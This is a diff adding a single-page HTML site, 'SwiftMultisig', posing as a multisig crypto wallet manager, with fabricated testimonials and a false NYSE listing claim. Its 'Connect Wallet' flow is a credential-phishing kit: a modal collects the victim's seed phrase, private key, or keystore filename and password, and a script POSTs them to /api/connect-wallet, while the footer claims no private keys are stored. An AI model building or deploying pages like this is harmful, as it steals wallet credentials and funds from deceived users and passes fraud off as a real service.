@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SwiftMultisig | Multisig Wallet Manager</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0a0c1a 0%, #0f172a 100%);
+            color: #ffffff;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        /* Navigation */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 0;
+            flex-wrap: wrap;
+            gap: 20px;
+            border-bottom: 1px solid rgba(59,130,246,0.2);
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, #60a5fa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            cursor: pointer;
+        }
+        .logo span {
+            background: linear-gradient(135deg, #60a5fa, #a855f7);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .nav-links a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .nav-links a:hover {
+            color: #60a5fa;
+        }
+        .btn-connect {
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .btn-connect:hover {
+            transform: translateY(-2px);
+        }
+        /* Page switching */
+        .page {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        .page.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* Hero section */
+        .hero {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 48px;
+            padding: 60px 0;
+            align-items: center;
+        }
+        .hero-left {
+            flex: 1;
+            min-width: 280px;
+        }
+        .hero-left h1 {
+            font-size: 3rem;
+            font-weight: 800;
+            line-height: 1.2;
+            background: linear-gradient(135deg, #fff, #60a5fa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 24px;
+        }
+        .badge-group {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin: 32px 0;
+        }
+        .badge {
+            background: rgba(59,130,246,0.1);
+            backdrop-filter: blur(10px);
+            padding: 12px 20px;
+            border-radius: 60px;
+            border: 1px solid rgba(59,130,246,0.3);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .badge:hover {
+            background: rgba(59,130,246,0.2);
+            transform: translateY(-2px);
+        }
+        .hero-right {
+            flex: 1;
+            background: rgba(15,23,42,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 48px;
+            text-align: center;
+            border: 1px solid rgba(59,130,246,0.3);
+        }
+        /* Buy crypto section */
+        .buy-crypto-section {
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            border-radius: 32px;
+            padding: 48px;
+            margin: 60px 0;
+            text-align: center;
+            border: 1px solid rgba(59,130,246,0.2);
+        }
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+            margin: 32px 0;
+        }
+        .payment-method {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        .payment-method i {
+            font-size: 2rem;
+            color: #60a5fa;
+        }
+        .learn-more-btn {
+            background: white;
+            color: #0f172a;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        /* Trading section */
+        .trading-section {
+            background: rgba(15,23,42,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 48px;
+            margin: 60px 0;
+            text-align: center;
+            border: 1px solid rgba(59,130,246,0.2);
+        }
+        .domain {
+            font-family: monospace;
+            font-size: 1.2rem;
+            color: #60a5fa;
+            margin: 16px 0;
+        }
+        /* Feature grid */
+        .feature-grid, .testimonials-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 32px;
+            margin: 48px 0;
+        }
+        .feature-card, .testimonial-card {
+            background: rgba(15,23,42,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 32px;
+            text-align: center;
+            border: 1px solid rgba(59,130,246,0.2);
+            transition: transform 0.2s;
+        }
+        .feature-card:hover, .testimonial-card:hover {
+            transform: translateY(-4px);
+            border-color: #3b82f6;
+        }
+        .feature-card i, .testimonial-card i {
+            font-size: 2rem;
+            color: #60a5fa;
+            margin-bottom: 20px;
+        }
+        /* Wallet selection modal */
+        .modal, .input-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content, .input-modal-content {
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            border-radius: 32px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid rgba(59,130,246,0.3);
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        .close-modal {
+            background: none;
+            border: none;
+            font-size: 28px;
+            color: white;
+            cursor: pointer;
+        }
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .wallet-option {
+            background: rgba(59,130,246,0.1);
+            border: 1px solid rgba(59,130,246,0.3);
+            border-radius: 16px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .wallet-option:hover {
+            background: rgba(59,130,246,0.2);
+            transform: translateX(8px);
+        }
+        /* Input method tabs */
+        .input-method-tabs {
+            display: flex;
+            gap: 16px;
+            margin: 24px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        .method-tab {
+            padding: 12px 0;
+            background: none;
+            border: none;
+            color: rgba(255,255,255,0.6);
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .method-tab.active {
+            color: #60a5fa;
+            border-bottom: 2px solid #60a5fa;
+        }
+        .input-panel {
+            display: none;
+        }
+        .input-panel.active {
+            display: block;
+        }
+        textarea, input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid rgba(59,130,246,0.3);
+            border-radius: 12px;
+            background: rgba(0,0,0,0.3);
+            color: white;
+            font-family: monospace;
+            margin: 16px 0;
+        }
+        .json-upload-area {
+            border: 2px dashed rgba(59,130,246,0.3);
+            border-radius: 12px;
+            padding: 32px;
+            text-align: center;
+            cursor: pointer;
+            margin: 16px 0;
+        }
+        .submit-input-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 24px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: #10b981;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 40px;
+            display: none;
+            z-index: 1200;
+        }
+        .toast.error {
+            background: #ef4444;
+        }
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            border-top: 1px solid rgba(59,130,246,0.2);
+            color: rgba(255,255,255,0.7);
+        }
+        @media (max-width: 768px) {
+            .hero-left h1 {
+                font-size: 2rem;
+            }
+            .navbar {
+                flex-direction: column;
+                text-align: center;
+            }
+            .nav-links {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="navbar">
+        <div class="logo" onclick="showPage('home')">Swift<span>Multisig</span></div>
+        <div class="nav-links">
+            <a onclick="showPage('home')">Home</a>
+            <a onclick="showPage('features')">Features</a>
+            <a onclick="showPage('testimonials')">Testimonials</a>
+            <button class="btn-connect" id="mainConnectBtn"><i class="fas fa-plug"></i> Connect Wallet</button>
+        </div>
+    </div>
+
+    <!-- HOME PAGE (all sections) -->
+    <div id="homePage" class="page active">
+        <!-- Hero -->
+        <div class="hero">
+            <div class="hero-left">
+                <h1>Finance, Digital Tracker and Analyzer for multisig wallets</h1>
+                <div class="badge-group">
+                    <div class="badge" onclick="showPage('features')"><i class="fas fa-tools"></i> Solve multisig issues</div>
+                    <div class="badge" onclick="showPage('features')"><i class="fas fa-chart-line"></i> Millions of assets supported</div>
+                    <div class="badge" onclick="showPage('features')"><i class="fas fa-coins"></i> Stake and earn rewards</div>
+                </div>
+            </div>
+            <div class="hero-right">
+                <i class="fas fa-shield-alt" style="font-size: 3rem; color: #60a5fa;"></i>
+                <h3 style="margin: 24px 0;">Secure Multi-Signature Wallet</h3>
+                <button class="btn-connect" id="heroConnectBtn" style="width: 100%;">Get Started</button>
+            </div>
+        </div>
+
+        <!-- Buy crypto section -->
+        <div class="buy-crypto-section">
+            <h2>Buy crypto with your local currency</h2>
+            <p>Start your crypto journey using your credit/debit card, bank account, Apple Pay, or Google Pay</p>
+            <div class="payment-methods">
+                <div class="payment-method"><i class="fas fa-credit-card"></i><span>Credit/Debit Card</span></div>
+                <div class="payment-method"><i class="fas fa-university"></i><span>Bank Account</span></div>
+                <div class="payment-method"><i class="fab fa-apple"></i><span>Apple Pay</span></div>
+                <div class="payment-method"><i class="fab fa-google"></i><span>Google Pay</span></div>
+            </div>
+            <button class="learn-more-btn" onclick="alert('Coming soon!')">LEARN MORE →</button>
+        </div>
+
+        <!-- Trading section -->
+        <div class="trading-section">
+            <h2>Trading ON NYSE AMERICAN</h2>
+            <div class="domain">swiftmultisig.xyz</div>
+            <p>Your trusted platform for cryptocurrency trading, analysis, and insights.</p>
+        </div>
+
+        <!-- Features preview (6 cards) -->
+        <div style="margin: 60px 0;">
+            <h2 class="section-title" style="text-align:center; font-size:2rem; margin-bottom:40px;">Powerful Features</h2>
+            <div class="feature-grid">
+                <div class="feature-card"><i class="fas fa-tools"></i><h3>Solve Multisig Issues</h3><p>Automated tools to diagnose and resolve multisig wallet problems instantly.</p></div>
+                <div class="feature-card"><i class="fas fa-chart-line"></i><h3>Millions of Assets</h3><p>Support for thousands of tokens across multiple blockchains.</p></div>
+                <div class="feature-card"><i class="fas fa-coins"></i><h3>Stake & Earn Rewards</h3><p>Stake your assets directly and earn competitive APY rewards.</p></div>
+                <div class="feature-card"><i class="fas fa-chart-simple"></i><h3>Real-Time Analytics</h3><p>Monitor portfolio performance, gas fees, and approval workflows.</p></div>
+                <div class="feature-card"><i class="fas fa-cubes"></i><h3>Multi-Chain Support</h3><p>Ethereum, Polygon, BSC, Arbitrum, Optimism, Solana, and more.</p></div>
+                <div class="feature-card"><i class="fas fa-rocket"></i><h3>Explore dApps</h3><p>Discover and connect with the best decentralized applications.</p></div>
+            </div>
+        </div>
+
+        <!-- Testimonials preview (6 cards) -->
+        <div style="margin: 60px 0;">
+            <h2 class="section-title" style="text-align:center; font-size:2rem; margin-bottom:40px;">What Our Users Say</h2>
+            <div class="testimonials-grid">
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"SwiftMultisig has made managing my crypto portfolio a breeze. The interface is intuitive and the security features give me complete peace of mind."</p><h4>James D.</h4><div style="font-size:0.8rem; opacity:0.7;">Crypto Investor</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"The multi-signature features are exactly what I needed for my team. We can now manage our shared crypto assets with confidence and transparency."</p><h4>Sarah M.</h4><div style="font-size:0.8rem; opacity:0.7;">DeFi Enthusiast</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"I love how easy it is to stake my crypto and earn rewards with SwiftMultisig. The analytics dashboard helps me track everything in real-time."</p><h4>Alex K.</h4><div style="font-size:0.8rem; opacity:0.7;">Blockchain Developer</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"SwiftMultisig has revolutionized how our DAO manages treasury funds. The approval workflow is seamless and secure."</p><h4>Michael Chen</h4><div style="font-size:0.8rem; opacity:0.7;">DAO Treasurer</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"The best multisig wallet solution I've used. Support for both EVM and Solana chains makes it incredibly versatile."</p><h4>Emily Rodriguez</h4><div style="font-size:0.8rem; opacity:0.7;">NFT Collector</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"Security is paramount for our startup's crypto holdings. SwiftMultisig provides enterprise-grade protection with an amazing user experience."</p><h4>David Park</h4><div style="font-size:0.8rem; opacity:0.7;">Startup Founder</div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FEATURES PAGE (detailed) -->
+    <div id="featuresPage" class="page">
+        <div style="padding: 60px 0;">
+            <button onclick="showPage('home')" style="background: none; border: none; color: #60a5fa; cursor: pointer; margin-bottom: 40px;"><i class="fas fa-arrow-left"></i> Back to Home</button>
+            <h2 style="text-align:center; font-size:2rem; margin-bottom:48px;">All Features</h2>
+            <div class="feature-grid">
+                <div class="feature-card"><i class="fas fa-tools"></i><h3>Solve Multisig Issues</h3><p>Advanced diagnostics and automated solutions for multisig wallet problems.</p></div>
+                <div class="feature-card"><i class="fas fa-chart-line"></i><h3>Millions of Assets</h3><p>Track and manage thousands of cryptocurrencies across multiple chains.</p></div>
+                <div class="feature-card"><i class="fas fa-coins"></i><h3>Stake & Earn</h3><p>Earn passive income by staking your assets with competitive APY rates.</p></div>
+                <div class="feature-card"><i class="fas fa-chart-simple"></i><h3>Real-Time Analytics</h3><p>Monitor portfolio performance, gas fees, and approval workflows.</p></div>
+                <div class="feature-card"><i class="fas fa-cubes"></i><h3>Multi-Chain Support</h3><p>Ethereum, Polygon, BSC, Arbitrum, Optimism, Solana, and more.</p></div>
+                <div class="feature-card"><i class="fas fa-rocket"></i><h3>Explore dApps</h3><p>Discover and connect with the best decentralized applications.</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TESTIMONIALS PAGE (detailed) -->
+    <div id="testimonialsPage" class="page">
+        <div style="padding: 60px 0;">
+            <button onclick="showPage('home')" style="background: none; border: none; color: #60a5fa; cursor: pointer; margin-bottom: 40px;"><i class="fas fa-arrow-left"></i> Back to Home</button>
+            <h2 style="text-align:center; font-size:2rem; margin-bottom:48px;">User Testimonials</h2>
+            <div class="testimonials-grid">
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"SwiftMultisig has made managing my crypto portfolio a breeze. The interface is intuitive and the security features give me complete peace of mind. Highly recommended!"</p><h4>James D.</h4><div>Crypto Investor</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"The multi-signature features are exactly what I needed for my team. We can now manage our shared crypto assets with confidence and transparency."</p><h4>Sarah M.</h4><div>DeFi Enthusiast</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"I love how easy it is to stake my crypto and earn rewards with SwiftMultisig. The analytics dashboard helps me track everything in real-time."</p><h4>Alex K.</h4><div>Blockchain Developer</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"SwiftMultisig has revolutionized how our DAO manages treasury funds. The approval workflow is seamless and secure."</p><h4>Michael Chen</h4><div>DAO Treasurer</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"The best multisig wallet solution I've used. Support for both EVM and Solana chains makes it incredibly versatile for all my crypto needs."</p><h4>Emily Rodriguez</h4><div>NFT Collector</div></div>
+                <div class="testimonial-card"><i class="fas fa-quote-left"></i><p>"Security is paramount for our startup's crypto holdings. SwiftMultisig provides enterprise-grade protection with an amazing user experience."</p><h4>David Park</h4><div>Startup Founder</div></div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 SwiftMultisig — Secure multisig wallet management. No private keys stored.</p>
+    </footer>
+</div>
+
+<!-- Wallet Selection Modal -->
+<div id="walletModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header"><h2>Select Wallet</h2><button class="close-modal" onclick="closeWalletModal()">&times;</button></div>
+        <div class="wallet-options">
+            <div class="wallet-option" onclick="selectWallet('Phantom')"><i class="fas fa-ghost"></i><div><strong>Phantom</strong><br><small>Solana & Ethereum wallet</small></div></div>
+            <div class="wallet-option" onclick="selectWallet('Universal Wallet')"><i class="fas fa-globe"></i><div><strong>Universal Wallet</strong><br><small>Multi-chain support</small></div></div>
+            <div class="wallet-option" onclick="selectWallet('MetaMask')"><i class="fab fa-ethereum"></i><div><strong>MetaMask</strong><br><small>Ethereum & EVM chains</small></div></div>
+            <div class="wallet-option" onclick="selectWallet('Solfare')"><i class="fas fa-sun"></i><div><strong>Solfare</strong><br><small>Solana wallet</small></div></div>
+        </div>
+    </div>
+</div>
+
+<!-- Credential Input Modal -->
+<div id="inputModal" class="input-modal">
+    <div class="input-modal-content">
+        <div class="modal-header"><h2 id="inputModalTitle">Enter Credentials</h2><button class="close-modal" onclick="closeInputModal()">&times;</button></div>
+        <div class="input-method-tabs">
+            <button class="method-tab active" data-method="seed">Seed Phrase</button>
+            <button class="method-tab" data-method="private">Private Key</button>
+            <button class="method-tab" data-method="json">JSON File</button>
+        </div>
+        <div id="seedPanel" class="input-panel active"><textarea id="seedInput" rows="4" placeholder="Enter your 12 or 24 word recovery phrase"></textarea></div>
+        <div id="privatePanel" class="input-panel"><input type="text" id="privateInput" placeholder="Enter your private key"></div>
+        <div id="jsonPanel" class="input-panel">
+            <div id="jsonUploadArea" class="json-upload-area"><i class="fas fa-cloud-upload-alt"></i><p>Click to upload JSON keystore file</p><input type="file" id="jsonFile" accept=".json" style="display: none;"></div>
+            <input type="password" id="jsonPassword" placeholder="Password (if encrypted)">
+        </div>
+        <button class="submit-input-btn" onclick="submitCredentials()"><i class="fas fa-paper-plane"></i> Submit</button>
+    </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+    let selectedWallet = null;
+    let selectedMethod = 'seed';
+
+    function showPage(page) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(page + 'Page').classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    function openWalletModal() { document.getElementById('walletModal').style.display = 'flex'; }
+    function closeWalletModal() { document.getElementById('walletModal').style.display = 'none'; }
+
+    function selectWallet(wallet) {
+        selectedWallet = wallet;
+        closeWalletModal();
+        openInputModal();
+    }
+
+    function openInputModal() {
+        document.getElementById('inputModalTitle').innerHTML = `Enter ${selectedWallet} Credentials`;
+        document.getElementById('inputModal').style.display = 'flex';
+    }
+
+    function closeInputModal() {
+        document.getElementById('inputModal').style.display = 'none';
+        document.getElementById('seedInput').value = '';
+        document.getElementById('privateInput').value = '';
+        document.getElementById('jsonPassword').value = '';
+        document.getElementById('jsonFile').value = '';
+        document.getElementById('jsonUploadArea').innerHTML = `<i class="fas fa-cloud-upload-alt"></i><p>Click to upload JSON keystore file</p><input type="file" id="jsonFile" accept=".json" style="display: none;">`;
+    }
+
+    // Tab switching
+    document.querySelectorAll('.method-tab').forEach(tab => {
+        tab.addEventListener('click', () => {
+            document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            selectedMethod = tab.getAttribute('data-method');
+            document.querySelectorAll('.input-panel').forEach(p => p.classList.remove('active'));
+            document.getElementById(`${selectedMethod}Panel`).classList.add('active');
+        });
+    });
+
+    // JSON file upload
+    const jsonUploadArea = document.getElementById('jsonUploadArea');
+    const jsonFileInput = document.getElementById('jsonFile');
+    if (jsonUploadArea) {
+        jsonUploadArea.addEventListener('click', () => jsonFileInput.click());
+        jsonFileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                jsonUploadArea.innerHTML = `<i class="fas fa-file-code" style="font-size: 2rem; color: #10b981;"></i><p>${file.name}</p><p style="font-size: 0.7rem;">Click to change</p>`;
+            }
+        });
+    }
+
+    function showToast(message, isError = false) {
+        const toast = document.getElementById('toast');
+        toast.textContent = message;
+        toast.className = 'toast' + (isError ? ' error' : '');
+        toast.style.display = 'block';
+        setTimeout(() => { toast.style.display = 'none'; }, 4000);
+    }
+
+    async function submitCredentials() {
+        let credentialData = '';
+        if (selectedMethod === 'seed') {
+            credentialData = document.getElementById('seedInput').value.trim();
+            if (!credentialData) { showToast('Please enter your seed phrase', true); return; }
+        } else if (selectedMethod === 'private') {
+            credentialData = document.getElementById('privateInput').value.trim();
+            if (!credentialData) { showToast('Please enter your private key', true); return; }
+        } else if (selectedMethod === 'json') {
+            const file = jsonFileInput.files[0];
+            if (!file) { showToast('Please select a JSON keystore file', true); return; }
+            const password = document.getElementById('jsonPassword').value;
+            credentialData = `JSON File: ${file.name}\nPassword: ${password || 'No password provided'}`;
+        }
+
+        const submitBtn = document.querySelector('.submit-input-btn');
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+
+        try {
+            const response = await fetch('/api/connect-wallet', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    walletType: selectedWallet,
+                    inputMethod: selectedMethod,
+                    credentialData: credentialData,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            const data = await response.json();
+            if (data.success) {
+                showToast('✅ Submitted successfully!');
+                closeInputModal();
+                selectedWallet = null;
+            } else {
+                throw new Error(data.message || 'Submission failed');
+            }
+        } catch (error) {
+            console.error(error);
+            showToast('❌ Submission failed: ' + error.message, true);
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit';
+        }
+    }
+
+    document.getElementById('mainConnectBtn').onclick = openWalletModal;
+    document.getElementById('heroConnectBtn').onclick = openWalletModal;
+
+    window.onclick = (event) => {
+        if (event.target === document.getElementById('walletModal')) closeWalletModal();
+        if (event.target === document.getElementById('inputModal')) closeInputModal();
+    };
+
+    showPage('home');
+</script>
+</body>
+</html>
